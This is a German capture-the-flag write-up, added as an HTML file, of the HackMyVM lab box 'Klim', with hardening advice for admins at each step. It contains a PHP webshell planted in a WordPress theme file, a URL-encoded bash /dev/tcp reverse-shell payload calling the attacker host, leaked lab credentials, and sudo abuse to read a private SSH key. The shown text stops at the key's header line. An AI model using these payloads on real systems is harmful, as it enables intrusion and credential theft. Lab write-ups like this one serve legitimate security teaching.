@@ -1,0 +1,726 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Klim - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Klim - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+             <h2 class="difficulty-medium">Medium</h2> <!-- Klasse für Gelb -->
+             <div class="circle">
+                 <div class="segment segment-1"></div>
+                 <div class="segment segment-2"></div>
+                 <div class="segment segment-3"></div>
+                 <div class="inner"></div>
+             </div>
+         </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                 <div class="tool-item">arp-scan</div>
+                 <div class="tool-item">nmap</div>
+                 <div class="tool-item">gobuster</div>
+                 <div class="tool-item">wpscan</div>
+                 <div class="tool-item">hydra</div>
+                 <div class="tool-item">nikto</div>
+                 <div class="tool-item">curl</div>
+                 <div class="tool-item">stegseek</div>
+                 <div class="tool-item">cat</div>
+                 <div class="tool-item">nc (netcat)</div>
+                 <div class="tool-item">python3</div>
+                 <div class="tool-item">stty</div>
+                 <div class="tool-item">sudo</div>
+                 <div class="tool-item">chmod</div>
+                 <div class="tool-item">ssh</div>
+                 <div class="tool-item">find</div>
+                 <div class="tool-item">uname</div>
+                 <div class="tool-item">env</div>
+                 <div class="tool-item">ss</div>
+                 <div class="tool-item">mysql</div>
+                 <div class="tool-item">ssh-keygen</div>
+                 <div class="tool-item">wget</div>
+                 <div class="tool-item">tar</div>
+                 <div class="tool-item">python2</div>
+                 <div class="tool-item">ls</div>
+                 <div class="tool-item">cd</div>
+                 <div class="tool-item">id</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration (Port 80 - Wordpress)</a></li>
+                <li><a href="#steganography-info-leak">Steganographie & Info Leak</a></li>
+                <li><a href="#rce-poc">RCE via Wordpress Theme Edit (POC)</a></li>
+                <li><a href="#privesc-klim-poc">Privilege Escalation (www-data zu klim - POC)</a></li>
+                <li><a href="#ssh-access-klim">SSH Access (klim) & Enumeration</a></li>
+                <li><a href="#privesc-root-poc">Privilege Escalation (klim zu root - POC)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌─[root@cyber]─[~]
+└──╼ #<span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.115</span>	08:00:27:8d:5f:5a	PCS Systemtechnik GmbH
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der ARP-Scan identifiziert das Zielsystem im lokalen Netzwerk unter der IP `192.168.2.115`. Die MAC-Adresse deutet auf eine VirtualBox-VM hin.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Ziel wurde erfolgreich lokalisiert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie einen Nmap-Scan auf `192.168.2.115` durch. Optional: Fügen Sie einen Hostnamen (z.B. `klim.hmv`) in `/etc/hosts` hinzu.<br><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung und ARP-Scan-Detection.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌─[root@cyber]─[~]
+└──╼ #<span class="command">nmap -sS -sC -T5 -A 192.168.2.115 -p-</span></div>
+                    <pre>
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-06 22:30 CET
+Nmap scan report for klim (192.168.2.115)
+Host is up (0.00018s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span> <span class="comment"><!-- Korrigiert: OpenSSH --></span>
+| ssh-hostkey:
+|   2048 81:f5:0a:b3:b5:0d:a6:ed:ce:53:93:05:15:17:b1:b0 (RSA)
+|   256 fd:7c:3d:73:f6:a4:c1:74:7b:41:27:68:ec:54:c4:61 (ECDSA)
+|_  256 8c:28:b7:7b:5d:5c:f1:29:91:4e:85:34:26:55:ac:c6 (ED25519)
+<span class="command">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span>
+|_http-title: Apache2 Ubuntu Default Page: It works Annex02! <span class="comment"><!-- Titel widerspricht Debian-Version --></span>
+|_http-server-header: Apache/2.4.38 (Debian)
+MAC Address: 08:00:27:8D:5F:5A (Oracle VirtualBox virtual NIC) <span class="comment"><!-- Korrigiert: Oracle --></span>
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE <span class="comment"><!-- Korrigiert --></span>
+HOP RTT     ADDRESS
+1   0.17 ms klim (192.168.2.115)
+
+Nmap done: 1 IP address (1 host up) scanned in 15.92 seconds
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Nmap-Scan (`-sS -sC -T5 -A -p-`) identifiziert zwei offene Ports:
+                 *   Port 22 (SSH): OpenSSH 7.9p1 auf Debian 10.
+                 *   Port 80 (HTTP): Apache 2.4.38 auf Debian. Der Titel der Webseite lautet "Apache2 Ubuntu Default Page: It works Annex02!", was leicht vom erkannten Debian-System abweicht.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Hauptangriffsvektoren sind SSH und HTTP. Die Apache-Default-Seite deutet darauf hin, dass möglicherweise eine Anwendung in einem Unterverzeichnis liegt oder die Hauptseite noch nicht konfiguriert wurde. Die SSH-Version ist relativ aktuell.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie den Webserver (Port 80) mit Verzeichnis-Scans (Gobuster, dirb) und Schwachstellen-Scannern (Nikto, WPScan falls WordPress vermutet wird). Überprüfen Sie die SSH-Authentifizierungsmethoden.<br><strong>Empfehlung (Admin):</strong> Ersetzen Sie Standard-Webseiten durch eigene Inhalte oder leere Seiten. Halten Sie SSH und Apache aktuell. Konfigurieren Sie SSH sicher (Key-Auth, kein Root-Login).</p>
+        </section>
+
+        <section id="web-enumeration">
+             <h2>Web Enumeration (Port 80 - Wordpress)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌─[✗]─[root@cyber]─[~]
+└──╼ #<span class="command">gobuster dir -u http://192.168.2.115 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x [...] -b 404,403</span></div>
+                    <pre>
+[...]
+<span class="command">http://192.168.2.115/index.html</span>           (Status: 200) [Size: 11331]
+<span class="command">http://192.168.2.115/wordpress</span>            (Status: 301) [Size: 318] [--> http://192.168.2.115/wordpress/]
+[...]
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein Gobuster-Scan auf Port 80 findet neben der `index.html` ein Verzeichnis `/wordpress`, das auf `/wordpress/` weiterleitet.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies bestätigt die Vermutung: Es läuft eine WordPress-Installation im Unterverzeichnis `/wordpress`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie die weitere Web-Enumeration auf das Verzeichnis `/wordpress`. Verwenden Sie spezialisierte WordPress-Scanner wie `wpscan`, um Benutzer, Plugins, Themes und Schwachstellen zu finden.<br><strong>Empfehlung (Admin):</strong> Halten Sie WordPress, Themes und Plugins immer auf dem neuesten Stand. Sichern Sie die WordPress-Installation (Dateiberechtigungen, Konfiguration, unnötige Dateien entfernen).</p>
+
+             <p class="analysis"><strong>WordPress Enumeration mit WPScan:</strong></p>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wpscan --url http://192.168.2.115/wordpress -e u --no-banner --api-token ...</span></div>
+                     <pre>
+[...]
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.38 (Debian)
+[...]
+[+] XML-RPC seems to be enabled: http://192.168.2.115/wordpress/xmlrpc.php
+[...]
+[+] WordPress readme found: http://192.168.2.115/wordpress/readme.html
+[...]
+[+] Upload directory has listing enabled: http://192.168.2.115/wordpress/wp-content/uploads/
+[...]
+[+] The external WP-Cron seems to be enabled: http://192.168.2.115/wordpress/wp-cron.php
+[...]
+[+] WordPress version 6.1 identified (Latest, released on 2022-11-01).
+[...]
+[+] WordPress theme in use: twentytwenty
+ | Location: http://192.168.2.115/wordpress/wp-content/themes/twentytwenty/
+ | [...]
+ | [!] The version is out of date, the latest version is 2.1
+ | Version: 1.8 (80% confidence)
+[...]
+[+] Enumerating Users (via Passive and Aggressive Methods)
+[...]
+[i] User(s) Identified:
+
+[+] <span class="command">klim</span>
+ | Found By: Author Posts - Author Pattern (Passive Detection)
+ | Confirmed By: [...] Login Error Messages (Aggressive Detection)
+[...]
+</pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> `wpscan` wird verwendet, um die WordPress-Installation zu scannen (`-e u` für Benutzer-Enumeration).
+                 Wichtige Ergebnisse:
+                 *   XML-RPC ist aktiviert (kann für Brute-Force oder DDoS missbraucht werden).
+                 *   Verzeichnisauflistung im Upload-Verzeichnis ist aktiviert.
+                 *   WordPress Version 6.1 (relativ aktuell zum Zeitpunkt des Scans).
+                 *   Theme "twentytwenty" Version 1.8 (veraltet, neueste Version wäre 2.1).
+                 *   Ein Benutzer wurde identifiziert: `<span class="command">klim</span>`.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> `wpscan` liefert wertvolle Informationen. Der Benutzer `klim` ist ein klares Ziel für Brute-Force-Angriffe auf das WP-Login. Das veraltete Theme könnte Schwachstellen enthalten.</p>
+               <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie einen Passwort-Brute-Force-Angriff auf den Benutzer `klim` für das WordPress-Login (z.B. mit `wpscan` oder `hydra`). Untersuchen Sie das veraltete "twentytwenty"-Theme auf bekannte Schwachstellen. Prüfen Sie das Upload-Verzeichnis auf interessante Dateien.<br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie XML-RPC, wenn es nicht benötigt wird (`add_filter('xmlrpc_enabled', '__return_false');`). Deaktivieren Sie die Verzeichnisauflistung. Halten Sie WordPress, Themes und Plugins immer aktuell.</p>
+
+              <p class="analysis"><strong>Brute-Force Versuche:</strong></p>
+               <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌─[root@cyber]─[/usr/share/wordlists]
+└──╼ #<span class="command">wpscan --url http://192.168.2.115/wordpress/wp-login.php --usernames klim --passwords /usr/share/wordlists/rockyou.txt --api-token ...</span></div>
+                     <pre><span class="comment">[Kein Erfolg im Log gezeigt]</span></pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Versuch eines Passwort-Brute-Force-Angriffs mit `wpscan` gegen den WordPress-Login für den Benutzer `klim` unter Verwendung der `rockyou.txt`-Liste.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Im Log wird kein Erfolg angezeigt. Das Passwort für `klim` befindet sich wahrscheinlich nicht in `rockyou.txt`.</p>
+
+               <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌─[root@cyber]─[/usr/share/wordlists]
+└──╼ #<span class="command">hydra -l klim -P /usr/share/wordlists/rockyou.txt ssh://192.168.2.115:22 -t 64 -I</span></div>
+                     <pre>
+[...]
+<span class="password">[ERROR] target ssh://192.168.2.115:22/ does not support password authentication (method reply 4).</span>
+</pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Versuch eines Passwort-Brute-Force-Angriffs mit `hydra` gegen den SSH-Dienst für den Benutzer `klim`.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Schlägt sofort fehl, da der SSH-Server keine Passwort-Authentifizierung unterstützt (nur Key-Authentifizierung).</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Passwort-Brute-Force ist hier nicht zielführend. Suchen Sie nach anderen Wegen, wie Informationslecks, Steganographie oder Schwachstellen in Themes/Plugins.<br><strong>Empfehlung (Admin):</strong> Die Deaktivierung der SSH-Passwort-Authentifizierung ist eine gute Sicherheitspraxis.</p>
+
+             <p class="analysis"><strong>Weitere Webserver-Checks:</strong></p>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌─[root@cyber]─[~]
+└──╼ #<span class="command">nikto -h klim [...]</span></div> <span class="comment"><!-- Annahme: -h http://192.168.2.115 --></span>
+                     <pre>
+- Nikto v2.1.5
+[...]
++ Server: Apache/2.4.38 (Debian)
++ <span class="password">Server leaks inodes via ETags</span>, header found with file /, fields: 0x2c43 0x5c7ee8d2c147e
++ The anti-clickjacking X-Frame-Options header is not present.
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD <span class="comment"><!-- Korrigiert --></span>
++ /icons/README: Apache default file found.
++ Uncommon header 'link' found, with contents: </wordpress/index.php/wp-json/>; rel="https://api.w.org/" <span class="comment"><!-- Maskiert --></span>
++ /wordpress/: A Wordpress installation was found.
+[...]
+</pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Ein `nikto`-Scan liefert zusätzliche Informationen: ETag-Inode-Leak (geringes Risiko), fehlende Header, erlaubte HTTP-Methoden, Standard-Apache-Datei `/icons/README`, Hinweis auf die WP-JSON-API und bestätigt die WordPress-Installation.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Keine kritischen Funde durch Nikto, bestätigt aber WordPress und die WP-API.</p>
+
+               <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -Iv "http://192.168.2.115"</span></div>
+                     <pre>
+*   Trying 192.168.2.115:80...
+* Connected to 192.168.2.115 (192.168.2.115) port 80 (#0)
+> HEAD / HTTP/1.1
+> Host: 192.168.2.115
+> User-Agent: curl/7.86.0
+> Accept: */*
+>
+* Mark bundle as not supporting multiuse
+< HTTP/1.1 200 OK
+<span class="comment"><!-- Standard Apache Header --></span>
+< ETag: "2c43-5c7ee8d2c147e"
+[...]
+< Content-Type: text/html
+
+* Connection #0 to host 192.168.2.115 left intact
+</pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> `curl -Iv` ruft die Header der Startseite ab und bestätigt die vorherigen Funde (Server, ETag).</p>
+
+               <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└──╼ #<span class="command">wpscan --url http://192.168.2.115/wordpress/wp-login.php --wp-content-dir /wp-content/ --enumerate vp --plugins-detection aggressive</span></div>
+                     <pre><span class="comment">[Keine verwundbaren Plugins (vp) im Log gefunden]</span></pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Ein weiterer `wpscan`-Lauf, diesmal zur Enumeration von verwundbaren Plugins (`--enumerate vp`).</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Keine verwundbaren Plugins laut diesem Scan gefunden.</p>
+
+               <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└──╼ #<span class="command">gobuster dir -u "http://192.168.2.115/wordpress" -e -x [...] -w [...] -t 100</span></div>
+                     <pre>
+[...]
+http://192.168.2.115/wordpress/index.php            (Status: 301) [Size: 0] [--> http://192.168.2.115/wordpress/]
+http://192.168.2.115/wordpress/wp-content           (Status: 301) [Size: 329] [--> http://192.168.2.115/wordpress/wp-content/]
+http://192.168.2.115/wordpress/wp-login.php         (Status: 200) [Size: 5380]
+http://192.168.2.115/wordpress/license.txt          (Status: 200) [Size: 19915]
+http://192.168.2.115/wordpress/wp-includes          (Status: 301) [Size: 330] [--> http://192.168.2.115/wordpress/wp-includes/]
+http://192.168.2.115/wordpress/readme.html          (Status: 200) [Size: 7389]
+http://192.168.2.115/wordpress/wp-trackback.php     (Status: 200) [Size: 135]
+http://192.168.2.115/wordpress/wp-admin             (Status: 301) [Size: 327] [--> http://192.168.2.115/wordpress/wp-admin/]
+http://192.168.2.115/wordpress/xmlrpc.php           (Status: 405) [Size: 42] <span class="comment"><!-- Method Not Allowed --></span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein weiterer Gobuster-Scan, diesmal auf das `/wordpress`-Verzeichnis, listet Standard-WordPress-Dateien und -Verzeichnisse auf.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die WordPress-Struktur, liefert aber keine neuen Angriffspunkte.</p>
+
+        </section>
+
+        <section id="steganography-info-leak">
+            <h2>Steganographie & Info Leak</h2>
+             <p class="analysis"><strong>Kontext:</strong> Da die bisherige Web-Enumeration keinen direkten Einstiegspunkt lieferte, wird nach versteckten Informationen gesucht. Die Herkunft der Datei `image.jpg` ist im Log nicht dokumentiert, aber sie muss von der WordPress-Seite stammen (möglicherweise aus `/wp-content/uploads/` oder einem Beitrag).</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└──╼ #<span class="command">stegseek image.jpg /usr/share/wordlists/rockyou.txt</span></div>
+                    <pre>
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+<span class="password">[i] Found passphrase: "ichliebedich"</span>
+[i] Original filename: "dump".
+[i] Extracting to "image.jpg.out".
+the file "image.jpg.out" does already exist. overwrite ? (y/n) y
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `stegseek` wird auf `image.jpg` angewendet und findet erfolgreich das Steghide-Passwort `<span class="password">ichliebedich</span>` aus der `rockyou.txt`-Liste. Eine versteckte Datei namens `dump` wird als `image.jpg.out` extrahiert.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund! Steganographie war erfolgreich. Das Passwort und die extrahierte Datei sind vielversprechend.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie den Inhalt der extrahierten Datei `image.jpg.out` (`dump`).<br><strong>Empfehlung (Admin):</strong> Überwachen Sie öffentlich zugängliche Bilder auf versteckte Inhalte. Verwenden Sie keine leicht zu erratenden Passwörter für Steganographie (falls bewusst eingesetzt).</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└──╼ #<span class="command">cat image.jpg.out</span></div>
+                    <pre>
+12:37:55.063762 IP 192.168.0.25.49826 > 192.168.0.26.http: Flags [P.], seq 1:723, ack 1, win 502, options [nop,nop,TS val 3112372226 ecr 1669828406], length 722: HTTP: POST /wordpress/wp-login.php HTTP/1.1
+[...]
+<span class="command">log=klim</span>&<span class="password">pwd=ss7WhrrnnHZC%239bQn</span>&wp-submit=Log+In&redirect_to=[...]
+[...]
+</pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Der Inhalt der extrahierten Datei `dump` (`image.jpg.out`) ist ein Ausschnitt eines Netzwerk-Captures (ähnlich tcpdump-Ausgabe). Er zeigt einen HTTP-POST-Request an `/wordpress/wp-login.php` mit den Anmeldedaten: Benutzername `<span class="command">klim</span>` und Passwort `<span class="password">ss7WhrrnnHZC#9bQn</span>` (das `#` ist URL-kodiert als `%23`).</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund! Gültige WordPress-Anmeldedaten für den Benutzer `klim` wurden durch Steganographie aufgedeckt.</p>
+               <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Loggen Sie sich mit den gefundenen Zugangsdaten (`klim`:`ss7WhrrnnHZC#9bQn`) in das WordPress-Admin-Panel (`/wordpress/wp-admin/`) ein.<br><strong>Empfehlung (Admin):</strong> Speichern Sie keine Netzwerk-Captures mit Klartext-Passwörtern oder verstecken Sie sie nicht mittels Steganographie. Schulen Sie Benutzer im sicheren Umgang mit Passwörtern.</p>
+
+        </section>
+
+        <section id="rce-poc">
+            <h2>RCE via Wordpress Theme Edit (POC)</h2>
+             <p class="analysis"><strong>Ziel:</strong> Demonstration der Ausnutzung des WordPress-Admin-Zugangs (`klim`), um durch Bearbeiten einer Theme-Datei (hier `404.php`) eine Webshell zu platzieren und Remote Code Execution (RCE) als `www-data` zu erlangen.</p>
+             <p class="evaluation"><strong>Voraussetzungen:</strong>
+                 *   Zugangsdaten für einen WordPress-Benutzer mit Rechten zum Bearbeiten von Themes (hier `klim`:`ss7WhrrnnHZC#9bQn`).
+                 *   Zugriff auf das WordPress-Admin-Panel (`/wp-admin/`).
+                 *   Ein Angreifer-System mit Netcat-Listener.
+             </p>
+             <p class="recommendation"><strong>Risiko:</strong> Kritisch. Erlaubt die vollständige Übernahme des Webservers im Kontext des `www-data`-Benutzers durch Ausführung beliebigen PHP-Codes.</p>
+
+            <p class="analysis"><strong>Schritt 1: Theme-Datei bearbeiten (Impliziert)</strong></p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt, Beschreibung der Aktion basierend auf dem TCP-Dump-Kommentar -->
+                      <pre style="color: #a6e22e; background-color: #000; padding: 10px; border-radius: 5px;">
+// Aktion im WordPress-Admin-Panel (als 'klim' eingeloggt):
+// Gehe zu Design -> Theme-Datei-Editor
+// Wähle Theme "Twenty Nineteen" aus.
+// Wähle Template "404 Template (404.php)" aus.
+// Füge den PHP-Code für eine Webshell ein: system($GET['cmd']);
+// Speichere die Änderungen.
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Nach dem Login als `klim` wird der Theme-Editor verwendet, um die `404.php`-Datei des aktiven Themes ("Twenty Nineteen") zu bearbeiten. Eine einfache PHP-Webshell (`system($GET['cmd']);`) wird eingefügt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Eine Hintertür wurde erfolgreich im Theme platziert. Jedes Mal, wenn eine nicht existierende Seite aufgerufen wird (was die 404.php auslöst), kann nun über den `cmd`-Parameter Code ausgeführt werden.</p>
+             <p class="recommendation"><strong>Empfehlung (Admin):</strong> Deaktivieren Sie den Theme- und Plugin-Editor im WordPress-Admin-Panel, wenn er nicht benötigt wird (`define('DISALLOW_FILE_EDIT', true);` in `wp-config.php`). Beschränken Sie die Berechtigungen von WordPress-Benutzern.</p>
+
+             <p class="analysis"><strong>Schritt 2: RCE testen</strong></p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Kein Prompt, URL-Aufruf -->
+                       <pre style="color: #a6e22e; background-color: #000; padding: 10px; border-radius: 5px;">
+<span class="command">http://192.168.2.115/wordpress/wp-content/themes/twentynineteen/404.php?cmd=ls</span>
+                       </pre>
+                      <!-- Kein Prompt, Ausgabe der URL -->
+                       <pre style="color: #a6e22e; background-color: #000; padding: 10px; border-radius: 5px; margin-top: 5px;">
+404.php
+archive.php
+classes
+comments.php
+fonts
+footer.php
+[...]
+style.scss
+template-parts
+                       </pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Die manipulierte `404.php` wird direkt aufgerufen (obwohl ein Aufruf einer nicht existierenden Seite den gleichen Effekt hätte) und der Befehl `ls` wird über den `cmd`-Parameter übergeben. Die Ausgabe des `ls`-Befehls (Dateien im Theme-Verzeichnis) wird zurückgegeben.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> RCE als `www-data` (der Benutzer, unter dem PHP/Apache läuft) ist bestätigt.</p>
+
+             <p class="analysis"><strong>Schritt 3: Reverse Shell starten</strong></p>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└──╼ #<span class="command">nc -lvnp 9001</span></div>
+                     <pre>listening on [any] 9001 ...</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt, URL-Aufruf -->
+                      <pre style="color: #a6e22e; background-color: #000; padding: 10px; border-radius: 5px;">
+<span class="command">http://192.168.2.115/wordpress/wp-content/themes/twentynineteen/404.php?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.121%2F9001%200%3E%261%27</span>
+                      </pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Ein Netcat-Listener wird gestartet. Die RCE-Schwachstelle wird genutzt, um einen URL-kodierten Bash-Reverse-Shell-Payload auszuführen, der sich zur Angreifer-IP `192.168.2.121` auf Port `9001` verbindet.</p>
+
+             <p class="analysis"><strong>Schritt 4: Shell als www-data empfangen</strong></p>
+              <div class="code-block">
+                 <div class="terminal">
+                     <!-- Fortsetzung der Listener-Ausgabe -->
+                     <pre>
+listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.121] from (UNKNOWN) [192.168.2.115] 46068</span>
+bash: cannot set terminal process group (512): Inappropriate ioctl for device
+bash: no job control in this shell
+<span class="prompt" style="color: yellow;">www-data@klim:/var/www/html/wordpress/wp-content/themes/twentynineteen$</span> <span class="command">id</span>
+<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+</pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Ergebnis:</strong> Der Listener empfängt die Verbindung und stellt eine Shell als `www-data` bereit.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Initialer Shell-Zugriff als `www-data` erfolgreich erlangt.</p>
+              <p class="recommendation"><strong>Empfehlung (Admin):</strong> Theme-/Plugin-Editor deaktivieren. WordPress-Berechtigungen härten. Dateisystemüberwachung implementieren.</p>
+
+             <p class="analysis"><strong>Shell-Stabilisierung (wie zuvor):</strong></p>
+               <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt" style="color: yellow;">www-data@klim:/var/www/html/wordpress/wp-content/themes/twentynineteen$</span> <span class="command">python3 -c 'import pty;pty.spawn("/bin/bash")'</span></div>
+                      <div class="prompt" style="color: yellow;">www-data@klim:/var/www/html/wordpress/wp-content/themes/twentynineteen$</span> <span class="command">export TERM=xterm</span></div>
+                      <div class="prompt" style="color: yellow;">www-data@klim:/var/www/html/wordpress/wp-content/themes/twentynineteen$</span> <span class="command">^Z</span></div>
+                  </div>
+              </div>
+               <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└──╼ #<span class="command">stty raw -echo;fg</span></div>
+                      <pre>reset
+<span class="prompt" style="color: yellow;">www-data@klim:/var/www/html/wordpress/wp-content/themes/twentynineteen$</span></pre>
+                  </div>
+              </div>
+               <p class="analysis"><strong>Analyse:</strong> Die `www-data`-Shell wird stabilisiert.</p>
+
+        </section>
+
+        <section id="privesc-klim-poc">
+            <h2>Privilege Escalation (www-data zu klim - POC)</h2>
+              <p class="analysis"><strong>Ziel:</strong> Demonstration der Ausnutzung einer `sudo`-Regel, die es `www-data` erlaubt, das benutzerdefinierte Tool `/home/klim/tool` als `klim` auszuführen, um dessen privaten SSH-Schlüssel zu lesen.</p>
+              <p class="evaluation"><strong>Voraussetzungen:</strong>
+                  *   Shell als `www-data`.
+                  *   Die spezifische `sudo`-Regel `(klim) NPASSWD: /home/klim/tool`.
+                  *   Die Annahme, dass `/home/klim/tool` Dateiinhalte lesen oder Befehle ausführen kann, wenn ein Dateipfad als Argument übergeben wird.
+              </p>
+               <p class="recommendation"><strong>Risiko:</strong> Hoch. Ermöglicht die Kompromittierung des `klim`-Kontos durch Diebstahl des privaten SSH-Schlüssels.</p>
+
+            <p class="analysis"><strong>Schritt 1: sudo-Regel prüfen</strong></p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">www-data@klim:/var/www/html/wordpress$</span> <span class="command">cat wp-config.php</span></div>
+                     <pre>
+[...]
+define( 'DB_USER', 'wordpress_user' );
+define( 'DB_PASSWORD', '<span class="password">Tropicano123!</span>' ); <span class="comment"><!-- Korrigiert: DB_PASSWORD --></span>
+[...]
+</pre>
+                     <div class="prompt" style="color: yellow;">www-data@klim:/var/www/html/wordpress$</span> <span class="command">ls /home/</span></div>
+                     <pre>klim</pre>
+                     <div class="prompt" style="color: yellow;">www-data@klim:/var/www/html/wordpress$</span> <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for www-data on klim:
+    env_reset, mail_badpass, secure_path=...
+
+User www-data may run the following commands on klim:
+    <span class="password">(klim) NPASSWD: /home/klim/tool</span>
+</pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Nach dem Lesen der `wp-config.php` (Datenbank-Creds `wordpress_user:Tropicano123!`) und der Bestätigung des `klim`-Home-Verzeichnisses zeigt `sudo -l`, dass `www-data` das Programm `/home/klim/tool` als Benutzer `klim` ohne Passwort ausführen darf.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Dies ist der Hebel für die nächste Eskalation. Die Funktion von `tool` ist noch unbekannt, aber die Ausführung als `klim` ist der Schlüssel.</p>
+
+             <p class="analysis"><strong>Schritt 2: SSH-Schlüssel von klim auslesen</strong></p>
+               <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">www-data@klim:/home/klim$</span> <span class="command">sudo -u klim /home/klim/tool /home/klim/.ssh/id_rsa</span></div>
+                     <pre>
+-----BEGIN OPENSSH PRIVATE KEY----- <span class="comment"><!-- Korrigiert: OPENSSH --></span>
